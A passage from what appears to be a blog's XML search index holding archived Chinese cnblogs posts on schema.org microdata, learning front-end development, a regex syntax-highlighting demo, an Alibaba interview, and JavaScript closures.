    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 人可以通过查看网站信息了解网站的内容，但是搜索引擎只对标签感兴趣，对内容的识别能力是很低的，如何让蜘蛛通过标签认识你的文章内容呢~原文网址：http://schema.org/docs/gs.html本文地址：http://www.cnblogs.com/hustskyking/p/let-your-page-understood-by-search-engine.html译者：Barret Lee日期：2013-11-01 许多站长应该对HTML标签十分熟悉，HTML标签告诉浏览器如何去呈现标签的内容，比如&lt;h1&gt;阿凡达&lt;/h1&gt;，告诉浏览器用大标题的形式显示\阿凡达”。但是，HTML标签本身并没有给出任何信息标识其中的内容，因此搜索引擎也无法智能地将相关的信息呈现给用户。Schema.org提供了一些相关的词汇，开发者可以用这些词汇嵌入到HTML内容中来强化内容，以便更容易被Google、Microsoft、Yandex以及Yahoo等搜索引擎识别。 一、如何使用元数据(microdata)来表示内容 1.为什么使用元数据人去阅读文章可以马上理解网页的相关内容，但是机器理解能力是十分有限的，给你的网页HTML添加一些额外的标签，让这些标签去告诉搜索引擎，\嘿，我描述的是一部电影，一个景点，一位名人或者一首音乐”，这样你就能让搜索引擎理解文章内容，并且让他在搜索结果中可以显示更多相关的内容。元数据是HTML5中的一些标签，他可以让你实现上述功能。2.itemscope和itemtype先举个简单的例子，比如你要显示\阿凡达”这部电影，包括这部电影的导演、类型，介绍，你的HTML代码可能会写成这样：123456&lt;div&gt; &lt;h1&gt;阿凡达&lt;/h1&gt; &lt;span&gt;导演: James Cameron (生于16-08-1954)&lt;/span&gt; &lt;span&gt;科幻电影&lt;/span&gt; &lt;a href=&quot;/path/to/obj.html&quot;&gt;Trailer&lt;/a&gt;&lt;/div&gt;刚开始我们来表示这一块是一个关于电影阿凡达的章节，我们需要给HTML添加itemscope属性123456&lt;div itemscope=&quot;&quot;&gt; &lt;h1&gt;阿凡达&lt;/h1&gt; &lt;span&gt;导演: James Cameron (生于16-08-1954)&lt;/span&gt; &lt;span&gt;科幻电影&lt;/span&gt; &lt;a href=&quot;/path/to/obj.html&quot;&gt;Trailer&lt;/a&gt;&lt;/div&gt;通过添加itemscope属性，搜索引擎就知道了这个div块表示的是一个特定的内容。为了让这个内容更加具体，我们可以继续添加一个itemtype属性123456&lt;div itemscope=&quot;&quot; itemtype=&quot;http://schema.org/Movie&quot;&gt; &lt;h1&gt;阿凡达&lt;/h1&gt; &lt;span&gt;导演: James Cameron (生于16-08-1954)&lt;/span&gt; &lt;span&gt;科幻电影&lt;/span&gt; &lt;a href=&quot;/path/to/obj.html&quot;&gt;Trailer&lt;/a&gt;&lt;/div&gt;这样蜘蛛就知道了这块的内容是介绍一部电影了。3.itemprop我们还能为搜索引擎提供什么其他的信息？电影有一些属性，如主演，导演，评分等。为了表示这些属性，我们可以使用itemprop：123456&lt;div itemscope=&quot;&quot; itemtype=&quot;http://schema.org/Movie&quot;&gt; &lt;h1 itemprop=&quot;name&quot;&gt;阿凡达&lt;/h1&gt; &lt;span&gt;导演: &lt;span itemprop=&quot;director&quot;&gt;James Cameron&lt;/span&gt; (生于16-08-1954)&lt;/span&gt; &lt;span itemprop=&quot;genre&quot;&gt;科幻电影&lt;/span&gt; &lt;a href=&quot;/path/to/obj.html&quot; itemprop=&quot;trailer&quot;&gt;Trailer&lt;/a&gt;&lt;/div&gt;4.内嵌一个itemscope有时候作为一个itemprop的属性也可以单独出来成为itemscope，比如导演，他是属于Person，Person也有很多诸如名字，生日等属性。12345678&lt;div itemscope=&quot;&quot; itemtype=&quot;http://schema.org/Movie&quot;&gt; &lt;h1 itemprop=&quot;name&quot;&gt;阿凡达&lt;/h1&gt; &lt;div itemprop=&quot;director&quot; itemscope=&quot;&quot; itemtype=&quot;http://schema.org/Person&quot;&gt; 导演: &lt;span itemprop=&quot;name&quot;&gt;James Cameron&lt;/span&gt; (生于 &lt;span itemprop=&quot;birthDate&quot;&gt;16-08-1954&lt;/span&gt; &lt;/div&gt; &lt;span itemprop=&quot;genre&quot;&gt;科幻电影&lt;/span&gt; &lt;a href=&quot;/path/to/obj.html&quot; itemprop=&quot;trailer&quot;&gt;Trailer&lt;/a&gt;&lt;/div&gt;二、使用 schema.org 提供的属性1.schema.org 提供的类型和属性并不是所有的网页都是关于电影和人物介绍的，除了上面我们说到的Movies和Person之外，schema.org还提供了一系列的类型，以及这些类型对应的属性。用的最多的是Thing这个类型，他有四个属性，name、description、url、image。这个类型对很多内容都实用。下面是一些常用的类型和属性：Creative works: CreativeWork, Book, Movie, MusicRecording, Recipe, TVSeries …Embedded non-text objects: AudioObject, ImageObject, VideoObjectEventOrganizationPersonPlace, LocalBusiness, Restaurant …Product, Offer, AggregateOfferReview, AggregateRating这里有一个对类型的列表，戳我。//Barret Say：schema给出的列表是规范统一的，对于你要用到的类，他基本上都有定义，不要自己构造他没有提到的类型。试想一下，如果每个人都给自己的内容定义多个类型，那搜索引擎该根据哪个标准来分类了，其结果就跟没有分类是一样的。2.期望的类型，文字和URL地址使用schema.org来标记你的网页时，有几点要注意：除了隐藏的文字，标记越多越好， 一般来说，给你的文章做越多这样的标记，搜索引擎就越对你的文字有亲和力。但是一定要注意，只标记那些人们看得见的文字，不要标记那些隐藏的文字。使用类型标注而不是文字，很多地方我们可以使用itemscope去标注他的内容，尽量少让那些干巴巴的文字放置在哪里。使用URL属性，比如我的博客首页有很多文章列表，对列表中的每一篇文章都应用URL的itemscope标记，这样效果会比较好3.测试你的标记Google提供了许多相关的测试工具来测试这些schema标记语法，比如这个：google webmasters，你可以用这些工具来检测格式是不是正确。三、进阶话题：机器可理解的版本信息许多页面可以用itemscope，itemtype以及itemprop来定义，但是有的时候，如果不加另外的注释，搜索引擎是很难理解某些属性的：日期, 时间等: 使用时间标签 datetime枚举以及引用等: 使用链接标签 href缺失以及隐含的信息: 使用meta标签 content.1.时间，日期 123&lt;time datetime=&quot;2011-04-01&quot;&gt;04/01/11&lt;/time&gt;&lt;time datetime=&quot;2011-05-08T19:30&quot;&gt;May 8, 7:30pm&lt;/time&gt;&lt;time itemprop=&quot;cookTime&quot; datetime=&quot;PT1H30M&quot;&gt;1 1/2 hrs&lt;/time&gt; 关于这些时间日期格式化的规范，请参看：ISO 8601 date/time standard。2.枚举以及引用等3.缺失以及隐含的信息因后面几个用的比较少，如果要做具体了解，请移步原网页。]]></content>
      <categories>
        <category>前端杂烩</category>
        <category>翻译</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端学习的那些往事]]></title>
    <url>%2Fblog%2F2013%2F10%2F31%2F2013-10-31-cb-learning-in-front-end%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 上次如何培育新人一文中也提到了自己学习前端的一些事儿，这两天几个新人问我当初是如何逐步学习前端的，因为以前也没做过什么记录，时间虽不长，记忆却开始模糊了，趁着还有些感觉，把这些往事都写下来。 之前看聂微东大哥的文章，有一篇说到了他学习前端的经历(说说我的web前端之路,分享些前端的好书)，主要是推荐几本前端学习的书籍，童鞋们可以去瞅一瞅。我想分享的并不是这些书籍，而是学习前端技术的一些经历，当然，也包括一些书籍。 初识前端 第一次和前端打交道，是大一的时候。那时我的一个舍友加入了学校很有名誉的一个技术团队&mdash;&mdash;联创团队，在design组做美工设计和简单的网页开发。一天晚上，宿舍熄灯了，他从团队赶回来，拿着笔记本继续写着代码，我凑过去看了看，觉得好神奇，他竟然可以把一张图片变成网页！那个时候对前端还没有太大的感觉，加上舍友经常呆在团队，也很少回来，所以这种隐约的神奇感一直保留到大二。 一次，我吃完午饭，在学校操场附近溜达，看见韵苑路口搭起了几顶帐篷，一群人围在一起很hign的样子。于是，我也凑了过去…看着那群人正在玩XBox，突然觉得她应该是一个很有爱的团队，于是写了申请书，就这样我加入了网络应用研发中心（Network Application Development Center, NADC），那年我大二。第一次新人任务，我认识了前端。 我是大二加入NADC的，那时我是个新人，很新很新的人，连HTML、CSS是个什么东西我都不知道。我也不知道自己是否喜欢前端这块，后来团队给新人们布置了一些练习任务，任务内容是从四张psd图中任选一张，将其制作成HTML页面。任务到手，我十分迷茫，根本不知道该做哪些东西，记得那个星期我是常驻团队办公室。 学长让我先看看 w3school 上HTML和CSS的相关内容，我埋着头看了两天，记得那两天，我坐着的时候是对着电脑，躺着的时候是拿着手机，一直在看网址上的内容，觉得很神奇，很好玩。大概是第三天开始，我动手写起了代码，代码写了差不多四天，没怎么休息，遇到了很多奇怪的问题。一个星期之后，我完成了人生的第一个页面戳我。 了解前端 很多人问我是做什么的，我回答，前端，大多数人听着会一头雾水，你要问我前端是什么，我现在还是不好给出一个明确的回答。前端要学的东西太多了，在给新人的第一培训中，我说了这些： 但是前端远不止这些东西，在这里我想说说看书的重要性。 我看过很多书，上面聂微东大哥说的书我在大三的时候就读过好几遍了，尤其是《javascript权威指南》，这本书第四版我看过四遍，第五版看过两遍，淘宝前端团队的第六版我看过一遍，现在还在读。我读书的目的是为了去了解整个前端以及他所用到的技术，这个很重要。我们学校有两个图书馆，我住在东边，所以经常会跑到东校区图书馆借阅一些书籍，去一趟图书馆就会带回来七八本书，两年下来，图书馆第四层前端相关的一百多本书籍基本被我一览无余，我不敢说自己对看到的那些知识都掌握了，但是我至少知道整个前端的发展历程，也学会了前端编码的基本技能。 一本书写下来，作者需要花很大的功夫去查阅文献，即便写得再烂，也是一个人思想的精华，也有很多值得借鉴的地方，所有开始你的阅览群书之旅吧！这是我在图书馆看过的部分书籍的书单：豆瓣读书，这里只是一部分，后来看过的书名也都忘记了，没有继续补上。读书绝不是唯一了解前端的途径。因为这个网络信息太多太复杂，不好把握，如果没有目标地去搜索，很有得到令人满意的结果。我们可以先从书中找到自己的兴趣，再去网络上学习，这样会更加有效率。 社区交流 学习CSS，我印象最深的就是不停的写，不知道写了多少个DEMO，也记不清写了多少个网站的页面（包括学校的，班级的，外面小公司的，仿站的，学习任务中的…），每次都写到吐，每次都是起床开始写、晚上熄灯了还在写，好多次都是熬到第二天七八点。或许你会我说太拼命，但我觉得成长是伴随着痛苦的！这些任务很多情况下都是团队主管安排给我的，我这个人好胜心和展示欲比较强，不管他给我的是一个页面还是一个网站的所有页面，我都会在三天之内完成，然后交给他，让他对我做一些评价，提一些学习意见，然后重构代码，然后提交给他看，直到他满意为止。 那段时间基本上没有白天黑夜，总感觉一天24个小时太少，现在想来，我收获的真是太多了！现在看到一个页面，扫一眼，基本知道整个结构，该用哪些标签哪些属性，也约摸着可以比较准确的说出完成这个页面要多长时间。这是我学习CSS的经历。 学习Javascript就不像上面那样通过无数的练习提高技能，JS的内容太多，覆盖面太广，有时候一个bug可以让你调试几天（对初学者）。看过很多相关的JS书籍之后，对一些基本的东西有了比较全面的了解，但是可以实践的场景却不是很多，至少不能发挥所学，JS涉及的面太广。也不知道是什么时候，我喜欢上了帮人解决问题，去百度贴吧，百度知道，论坛，社区，QQ群等等，每天多进程的去找问题。 帮人解决问题是一件非常愉快而且有收益的事情，看到了自己会的东西，把想法说出来，说给大家听，比你\牛B”的人会指出你回答中的错误，这是已经互动学习。其实更多的情况是你对别人提出的问题也想不出解决方案，这个时候也正是一次学习的大好机会，我一般是这样做的：搜索相关内容，阅读别人写的博客内容（你想到的问题，网络上已经有人想到过，并且已经给出了解答，这也是知识共享的好处），如果在阅读时遇到了不懂的生词或者技术，继续去搜索，要把一个问题涉及到的周边问题都搞清楚，这才算是深入学习！解答问题的过程中，你还可以去结实一些朋友，有些朋友的技术水平已经相当高了，比如@张鑫旭，薛端阳，@玉伯等等，你可以去结实他们，向他们请教问题，跟他们去交流。 吃透一个知识点 上面也说了怎么去解决一个问题，如何吃透一个知识点，这个也需要拿出来谈一谈。有些网站的内容是比较有权威性质的，比如http://www.whatwg.org/、//developer.mozilla.org/、http://www.w3.org/等，如果你对这些网站比较熟悉而且英文水平还行的话，建议直接去查找你要的答案，一定可以找到（不过很难找）。 要弄清楚这个知识点包含哪些关键词，这样在网络上搜到的结果才是靠谱的，很多人真的不会搜索！大学有一门课程叫做文件情报检索，感兴趣的童鞋可以去选修这门课，我这里也有这门课程的相关PPT，可以给我邮件(barret.china@gmail.com)。 博客 我写了两年博客了，刚开始主要是摘录、收藏、转载，看到自己觉得不错的东西，拿过来当做是笔记。最开始我是在Qzone上写，后来，发现有点傻，Qzone根本不是写博客的地儿，后来改到了点点网，再接着是博客园，再接着是github，以后可能还会换。为什么会有这么一个转变，阮一峰老师一篇文章说了这样的话：喜欢写Blog的人，会经历三个阶段。 第一阶段，刚接触Blog，觉得很新鲜，试着选择一个免费空间来写。 第二阶段，发现免费空间限制太多，就自己购买域名和空间，搭建独立博客。 第三阶段，觉得独立博客的管理太麻烦，最好在保留控制权的前提下，让别人来管，自己只负责写文章。 喜欢分享的人都会找到一种途径去分享自己觉得不错的东西，博客一种很直观的方式。我曾经写过的东西：Qzone点点网 http://qianduan-notes.diandian.com/博客园 http://hustskyking.cnblogs.com/现在的&nbsp;github pages我现在就是通过博客在分享自己的东西，网络上成千上万的人都在干同样的事情，关于为什么要写技术博客，如何写技术博客，很多前辈们都写了相关的文章，可以去看一看。 瞄准公司 对学生来说，学技术只是一种兴趣。我一直对团队新成员灌输这样的思想，要把你们的技术发展成一门特长，兴趣停留的层次太低了，你很难接触到你所热衷的东西的最有趣的的部分。但对于那些想从事这方面工作的人来说，你不仅要把这个兴趣发展为特长，更重要的是发展成你的职业特长，全方位地了解这个行业。 因为自己团队很多学长学姐都进了很多不错的互联网大公司，所以最开始我就给自己定下了一个目标，我也要去这些大公司！（有点像高三时候的性格，我也要进好学校！） 所以当自己对前端有一定程度的了解之后，我开始去网上查看各公司对人才的招聘要求。刚从百度上面扒过来的（Web前端研发工程师【校招】）：工作职责： 百度各产品Web前端研发 百度各产品易用性改进和界面技术优化 Web前沿技术研究和新技术调研 职位要求： 精通JavaScript、Ajax等Web开发技术 精通HTML/XHTML、CSS等网页制作技术，熟悉页面架构和布局 熟悉W3C标准，对表现与数据分离、Web语义化等有深刻理解 对互联网产品和Web技术有强烈兴趣，有优秀的学习能力和强烈的进取心 具有良好的沟通能力和团队合作精神、优秀的分析问题和解决问题的能力 具有以下能力者优先考虑： 具有Mobile WEB/WAP、HTML5/CSS3、nodejs、Flash开发经验 精通一种模板语言（Smarty、Velocity、Django等） 熟悉Linux平台，掌握一种后端开发语言（PHP/Java/C/C++/python等） 有前端性能优化经验 具有一定的软件工程意识，对数据结构和算法设计有充分理解 对着这些要求，睁大眼睛看看自己，还缺那些，那些还做的不够，我相信你很快就有了前进的方向了！我以前也是对着这些点学习的，所以很容易得到那些公司的认可。后来也去看了下facebook的一些要求（Software Engineer- Front End）：Are you passionate about building UI to help those around you be more effective? What about building UI that your peers use daily and can1t wait for your next feature to be released? Facebook is seeking an experienced Front End Engineer to build the next generation UI for our infrastructure layer, to control hundreds of thousands of services and help our engineers digest the Terabytes of stored data. This is a full-time position based in our office in Palo Alto.Responsibilities Design and build user interface and data visualization for engineers to control and monitor services and servers Code primarily in PHP, JavaScript and CSS Understand engineer requests and come up with designs for the user workflow Participate in design and code reviews Interact with other team members to incorporate their innovations and vice versa Requirements Over 3+ year experience with PHP and JavaScript Experience with web technologies (HTML/CSS/JS) 2+ years of building interactive web applications Passion for elegant and intuitive user interfaces BS or MS degree in Computer Science or a related technical field 这些东西不仅是给你学习的方向，还给你学习的东西，对照着可以看到你离公司的门槛还有多少_^ 细节和态度 有段时间，自己很浮躁，觉得很多东西都会了。书看多了，你会发现很多书籍的内容都是差不多的，也没有太多吸引人的地方，于是怎么也看不下去了，走马观花，稍微撇两眼就把书扔了。这种状态我很可以理解！因为我也是经常处于这种状态。 有些东西需要去平品味，去思考，以前的学习几乎就是把知识强硬灌输到脑海中，过了一段时间快要忘记了，再去看一遍，多看几遍印象就什么，但是这样学习方式是很痛苦的，而且效率也很低。现在的话，我会想，为什么他要这样设计，这样设计是否欠妥，是不是还有更优的解决方案… 尝试着去否定所谓的权威，这些理念都是人提出来的，谁都不能保证一个人的逻辑思维是十分完善和全面的，我们也是人，对他们提出质疑这是完全合理的，不要有任何觉得不妥的地方！ 前端资讯 说说关注互联网的重要性。前面说我看过很多书，就目前来看，我对前端的认识依然是远远不够的，你要知道，一本稍微有内容的优秀的书籍写出来至少要一到两年时间，而且搞技术的人也不会全身心投入到著作中，他们也需要工作。所以你在书中，即便是最新出版的书中，看到的技术不会特别新了，至少落后了两到三年时间。看老外们写的博客，每每看到博客日期的时候，都不禁感叹，我没见过的东西，人家在三年前就已经很熟练了。这就是我们跟那些技术先驱的差距，所以如果要了解这个行业的动向，一定要多关注前端资讯！ 前端构架 很多公司都在研究一套属于自己的前端集成解决方案，如百度的FIS，阿里的seajs等，也有很多牛人在研究自己的前端库、框架，如司徒正美的avalon，老赵的wind.js，cujojs的when.js等等，看看这些人的博客，也会感叹，人家两三年前也开始搞起来了，代码写的也是相当出色的！说这些东西，是为了说明，前端方面水很深，如果发现自己没啥事干了，这些东西一定会让你有所触动，也算是学到一定水平之后会主动去学习的东西。 小结 敲了一下午，手都敲疼了。 本文就当是对自己的一个自我介绍吧，谈了下我对前端学习的一些感受，每次面试都会被问到是如何学习前端的，回答多了感觉也忒无聊的- -]]></content>
      <categories>
        <category>前端杂烩</category>
        <category>观点和感想</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[玩转正则之highlight高亮]]></title>
    <url>%2Fblog%2F2013%2F10%2F07%2F2013-10-07-cb-javascript-regexp%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 程序员在编写代码的时候少不了和字符串以及\查询”打交道，两者的交集中有一个叫做正则表达式的的东西，这家伙用好了可以提高编程效率，用不好的话…你可以先去好好学一学。 关于正则的使用，举个简单的例子： 123456789var m = location.href.match(/(\w+:)\/&#123;0,3&#125;([^\/]+)(?:(\/[^\?#]*))?(?:(\?[^#]+|.+))?(?:(#.*))?/);var res = &#123; protocol: m[1], host: m[2], path: m[3], search: m[4], hash: m[5]&#125;;console.log(res); 憋了几分钟= =||，我也觉得这个正则不是特别好理解（红黑相间了，应该稍微清晰点），有些朋友可能不知道（?:content）是什么意思，还有类似（?!content）和(?=content)分组和前瞻的知识，建议去问问度哥和谷娘。 一. 正则应用小DEMO示例下面是一串随手写的代码，放在textarea中：/ @author barret lee @date 2013-10-06 @email barret.china@gmail.com ///outer varvar a = “this id outer string”;//closurefunction b() { //inner var var a = “this is inner string”; var g = a.replace(/this is inner string/g, function() { return new Function(“/clousure/this.a”)(); }); / @description closure - regExp test @author barret lee */ function c() { return { a: a, g: g } } return c;}var s = b()(); //s.a, s.g正则匹配，处理上面那堆字符串的小DEMO：&nbsp;点击开始演示博客园引入个js文件还真罗嗦，有时候会报XSS（跨站脚本攻击）相关的错误，（如果木有正常显示，刷新下试试）。如果还是没有，可以看另外一个demo：SAE/highlight跟着提示，下一步下一步多点几下，可以看出效果还是可以滴。主要是这里的正则略微的麻烦，处理一个色变得琢磨老半天。P.S：上面这玩意儿只是一个小测试，代码相当不健壮，拿着学习正则练手～二. 需要注意的地方 12345678910//step configvar config = &#123; regs: [ /^\s+|\s+$/g, /([&quot;&apos;])(?:\\.|[^\\\n])*?\1/g, /\/(?!\*|span).+\/(?!span)[gim]*/g, /(\/\/.*|\/\*[\S\s]+?\*\/)/g, /(\*\s*)(@\w+)(?=\s*)/g, /\b...\b/g ], //...&#125;; 这些正则我是分开来写的，主要是为了做上面那个demo，方便单步显示。但是把这些正则分开写是相当不合理的，放在textarea中的是一串没有任何标签的字符串，为了着色，每处理一个正则都会在codes中插入一些标签（我这里用的是span），当我们处理下一个正则的时候就必须得考虑上一步加入的标签，这样会很大程度提高开发难度，最好的做法是把这些正则都放到一坨，然后用|隔开： 1var reg = (/^\s+|\s+$/)|(/([&quot;&apos;])(?:\\.|[^\\\n])*?\1/)|(/\/(?!\*|span).+\/(?!span)[gim]*/)|(/(\/\/.*|\/\*[\S\s]+?\*\/)/)|(/(\*\s*)(@\w+)(?=\s*)/)|(/\b(break|continue|do|for|in|function|if|else|return|switch|throw|try|catch|finally|var|while|with|case|new|typeof|instance|delete|void|Object|Array|String|Number|Boolean|Function|RegExp|Date|Math|window|document|navigator|location|true|false|null|undefined|NaN)\b) 这样放的好处是可以直接 1234codes.replace(reg, function()&#123; var args = arguments; //...&#125;); 一次性处理，不用担心插入标签影响最后的结果，因为标签是同一时间插入的，不会有干扰。代码高亮插件highlight的基本原理也差不多，只不过他的容错机制和代码健壮性这块做的更加完善，我在代码里头加了一个配置文件， 1234567var colors = &#123; string: &quot;#FFA0A0&quot;, reg: &quot;#16E916&quot;, note: &quot;#888&quot;, tag: &quot;orange&quot;, keywords: &quot;#B0B0FF&quot;&#125;; 按照自己的喜好，也可以加以修改，类似这样的扩展，我们在写代码的时候稍微注意下，多留几个接口就好了。（不过这些活儿干起来都还挺辛苦的～）没有做成插件，也没这个必要，知道基本原理然后动手实践下就差不多了。 三. 小结 类似很多的前端模板，artTemplate，baiduTemplate等都是对正则表达式的绝伦应用，很值得去看看源码，好好钻研人家都考虑了那些容易出错的点，源码都不长，两三百行。了解一个大概比较容易，但是当自己动手的时候总会发现很多细节问题处理不好，我那上面几个正则就倒弄了半天= =另外一个配色方案，随便弄的，戳这里SAE/highlight。正则表达式，用起来还是挺方便的。正则技能，你值得拥有～]]></content>
      <categories>
        <category>JavaScript</category>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
        <tag>正则</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[阿里面试的一点感受]]></title>
    <url>%2Fblog%2F2013%2F09%2F26%2F2013-09-26-cb-mianshi-alibaba%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. &lt;!– [废话开始] 百度实习三个月，明天就要离职了，感觉还挺开心的，同事们都很照顾我，Boss也比较欣赏我，我很满足了。掐指一算，这大四其实也没几个月了，同事们都在感叹大学的那些事儿，也告诫我要好好享受大学最后的时光，我会好好把握！ 离开之前呢，还挺幸运的，这几天阿里在各地招人，我也去试了一把，由于之前拿过阿里的实习offer，所以笔试就给免了，呵呵，也省得我再去做那些枯燥的笔试题。不过期间也有不少的坎坷，就不细说了= = 下午四点去北京大望路附近某个旮旯里头找alibaba。阿里给我的第一印象就是设计很给力，公司的橙色主题色也十分醒神，特别是那些HR美眉，虽说有些事情是她们的职责，表现出来的和蔼还是挺发自内心的，赞！刚去的时候，一堆HR在开会，应该是讨论招新的事情吧，全是妹纸= = 然后一个人磨叽磨叽的凑了过去，被人发现之后，HR老大停止了说话，然后所有人的目光投向了我，额。。。HR老大带我去了一个会议室，让我先等一下，说面试官还没到。 [废话结束]–&gt;&nbsp;&nbsp; 刚坐下不久，面试官到了，他告诉我他花名是”李牧\，表示不认识啊，囧。问我有没有写阿里的笔试题，当时就帮同事做了下，模糊记得自己也做了一份，然后他来了个干瞪眼，说：\你自己做没做都不知道，那来这儿干嘛！\，语塞了几秒钟，回答说：”我有收到不用笔试直接过来面试的短信= =||\。 先给了我四道题目，他趁我做题之际把我的博客和github都瞄了一通。面试题目都比较有深度，我觉得要构思几道不错的题目还挺难的，虽说记得原题，我就不贴出来了，就大概说说他都考核了哪些知识吧～ 1. 值类型 引用类型的理解，如 123456789var a = &#123;&quot;x&quot;: 1&#125;;var b = a;a.x = 2;b.x;a = &#123;&quot;x&quot;:3&#125;;console.log(b.x);a.x == 4;console.log(b.x); 算是比较基础，但是b.x的结果是多少，你就别弄错了。 2. 闭包+作用域链+单线程+垃圾回收 问你对闭包中一些变量的生存期，闭包一些值如何才能够作用域链中获取，setTimeout函数的考核，GC的标记清理和循环计数等，算是些比较常见也比较容易出错的点。 3. 作用域+构造函数+设计模式+对\类”的深入理解 虽说他给的就一道小题目，但是涉及的内容还挺多的，需要对一些基础东西有比较深刻的理解才能答好。 4. 原型链+继承+ES5+继承优化 ES5中Object.create()函数，prototype，new Class()等之间的相互比较，坑很多，容易踩进去。 就这四道题目，考核的内容还是相当广泛的，如果你想临时看下前端知识，然后去阿里试试手，我看还是算了，很多东西真的需要有一定的知识积淀，对一些比较常用的东西要有深刻的理解才不会频频语塞，面试官都喜欢刨根问底，要是那个点没有掌握好，他可能会潜意识抓住这个空缺，把你问倒。不过李牧大哥人挺好的，没故意刁难我。走的时候听HR说他等级是P8，也不知道在阿里是个什么位置= = 我们目前是一群码农，但是要有点思想。拿着一本ECMAScript的规范，很少有人能够硬着头皮把书啃完，因为内容太生硬，太晦涩了。首先咱们应该抛开那种\权威就是标准”的意识，带着疑问和反问去了解别人的思想，我们脖子上的是人脑，不是磁盘，记东西这事应该让磁盘来做，我们需要做的是分析和思考，让这些数据展现出他们的价值，当然，也需要去记一点东西，不要一个splite函数还想着查文档，不要函数是什么还得去百度谷歌看定义，也需要有些基础知识的积淀。 奋斗吧，再不拼命我们就老了！]]></content>
      <categories>
        <category>JavaScript</category>
        <category>观点和感想</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[对闭包机制的深入理解]]></title>
    <url>%2Fblog%2F2013%2F09%2F23%2F2013-09-23-cb-javascript-closure%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 对于JavaScript初学者来说，闭包是一个很神秘的东西，不管看多少遍，依旧搞不清楚闭包是什么，更不明白其内部是什么样的处理机制（更可恶的是每次面试都会被问到）。 说的含糊一点，闭包就是代码块和该代码块上下文（context）相互作用的产物。看一个例子： 12345678910function foo()&#123; var x = 1; return function ()&#123; alert(++x); //2 &#125;&#125;var bar = foo();bar(); 先问一个问题，这里到底谁是闭包？是foo还是那个匿名函数？ 闭包的产生原理 在JavaScript中，函数可以用来分隔作用域，当foo执行（activation）的时候，产生了一个foo的动态作用域，然后这个动态作用域把变量x和那个return的匿名函数装（push到栈）了进去，一般情况下，当函数执行完毕时，它会自动销毁（pop出栈）内部产生的变量和函数，跳出这个作用域环境，返回到上一层（context）。但是在这里，由于foo作用域内部的变量和函数与它作用域外部的变量bar存在暧昧关系（bar引用了foo()的返回值），所以变量x和匿名函数没法从foo作用域中被销毁，于是也就产生了我们平时所说的闭包。刚才说的push到栈和pop出栈很已经显然不适用于闭包，这和栈的结构是相悖的，那么闭包是怎样的内存分配方式呢？这个我们后面再说。闭包既不是foo函数，也不是那个匿名函数，而是变量x、匿名函数、上下文环境三者一起同时存在的结果。 闭包存在有这么两个条件：没有被创建它的上下文销毁引用了自由变量（没有在函数块中定义，也没有从arguments中送入，如上匿名函数中的变量x，就是一个自由变量） 说了这么多，再看看下面这个例子： 12345678910var x = 1;function foo()&#123; alert(x);&#125;~function()&#123; var x = 2; foo(); //1&#125;(); 你可能又不解了，这里怎么会弹出1呢？先说明下，下面三种写法效果是等价的（但解析方式并不一样，A、C是一类，B是另一类，这里就不多说了）： 1234567891011121314151617~function()&#123; var x = 2; foo();&#125;(); //A(function()&#123; var x = 2; foo();&#125;()); //B(function()&#123; var x = 2; foo();&#125;)(); //C 闭包的内存分配方式 回归正题，上面为什么会弹出1，这个闭包的情况和上面所述的闭包有些不太相同，上面的闭包是因为作用域中的东西没有被销毁，并与上下文存在暧昧关系，而这里并不存在销毁什么的问题，但是它依旧是一个闭包。在foo中，x是一个自由变量，当foo这个闭包产生的时候，foo的上下文会被保存，而foo处于Activation状态的时候，它会先从他所处的Activation Object（foo内部声明的变量、函数等非自由变量）中查找需要的对象，如果没有找到，便会从它开始保存的上下文中查找对象，如果还没找到，才会跑到他的上一层作用域链中取那个值为2的x。 再回到之前说的那个问题，闭包的内存分配方式。很明显，如果闭包的内存分配是利用栈的结构实现的，那进入foo运行状态的时候，应该会push一个\全局\的x，也就是向上找到那个var x = 2，接着alert(2)；但事实并非如此，上层作用域的闭包数据是动态分配的内存，也就是保存在堆里，解析器会记录这个闭包数据被引用的次数，当引用次数为0的时候，垃圾回收机制（GC）会自动处理这些垃圾。 闭包是如何霸占内存的 IE经常会因为闭包的存在而导致内存居高不下。第一个例子中： 1window &lt;=&gt; foo &lt;=&gt; 匿名函数 &lt;=&gt; bar &lt;=&gt; window &lt;/=&gt;&lt;/=&gt;&lt;/=&gt;&lt;/=&gt; 形成了一个引用循环，即便是 1bar = null; 这个匿名函数的引用次数依旧大于0。需要注意的即便是是delete一个变量并不是删除这个变量的引用对象，而是断开这个引用，其作用就是让引用对象的引用次数减1. 这样一来，这个闭包就死在内存里了，于是它也就一直占用着内存= = 小结 原型链、闭包、作用域链的学习，除了对这些基本知识有一定了解之外，还需要比较多的尝试和实践才能理解透彻。很多次想说说闭包的含义，但是每次提笔又觉得自己没有想明白，只好作罢。这一次对闭包的浅析，肯定也存在很多不到位或者描述错误的地方，如果有不同的见解，请提出来，大家相互学习！！！ &nbsp;]]></content>
      <categories>
        <category>JavaScript</category>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript中需要注意的几个问题]]></title>
    <url>%2Fblog%2F2013%2F09%2F22%2F2013-09-22-cb-javascript-attention%2F</url>
